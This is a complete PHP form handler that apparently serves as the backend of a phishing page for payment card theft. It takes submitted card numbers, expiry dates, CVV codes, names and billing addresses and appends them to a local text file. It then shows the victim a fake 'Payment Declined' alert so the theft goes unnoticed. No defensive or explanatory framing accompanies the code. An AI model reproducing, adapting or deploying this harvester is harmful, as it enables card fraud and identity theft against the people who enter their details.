<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Define an associative array to store form data with field names
    $formData = array(
        'Amount' => $_POST["amount"],
        'First Name' => $_POST["first_name"],
        'Last Name' => $_POST["last_name"],
       
        'Card Number' => $_POST["card_number"],
        'Expiration Date' => $_POST["expire_date"],
        'CVV' => $_POST["cvv"],
        'Address' => $_POST["address"],
        'City' => $_POST["city"],
        'State' => $_POST["state"],
        'ZIP Code' => $_POST["zip"]
    );

    // Convert the associative array to a JSON string
    $jsonData = json_encode($formData);

    // Specify the path to the text file where you want to save the data
    $filePath = "form_data.txt";

    // Open the file in append mode and save the JSON data in a single line
    if (file_put_contents($filePath, $jsonData . PHP_EOL, FILE_APPEND | LOCK_EX)) {
        
        echo "<script>";
        echo "alert('Payment Declined !');";
        echo "window.location.href = 'index.php';";
        echo "</script>";
    } else {
        echo "Error saving data.";
    }
} else {
    echo "Invalid request.";
}
?>
